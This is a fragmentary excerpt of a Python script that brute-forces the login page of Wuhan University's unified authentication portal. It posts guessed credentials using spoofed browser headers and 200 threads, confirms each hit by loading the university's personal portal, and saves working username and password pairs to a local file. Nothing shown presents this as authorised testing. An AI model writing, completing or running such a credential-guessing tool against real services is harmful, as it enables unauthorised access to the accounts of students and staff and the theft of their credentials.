...
LOG_FILE = r'e:\whu\amserver\%s.log'%log_name
...
#                'institute':'WHU'    
#                }
        url='http://uis1.whu.edu.cn/amserver/UI/Login'
        headers={
                'Referer':'http://uis1.whu.edu.cn/amserver/UI/Login',
                'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36'
                }
        postdata={
                'IDToken0':'',
...
#        content=response.text
        mark_url='http://my.whu.edu.cn/'
        response=session.get(mark_url,headers=headers)
        content=response.text
    ...
    def save(self,username,password):
        with open(r'e:\whu\amserver\data.txt','w+') as f:
...
if __name__=='__main__':
    b=Brute(password_set,username_set,thread_num=200)
    b.start()
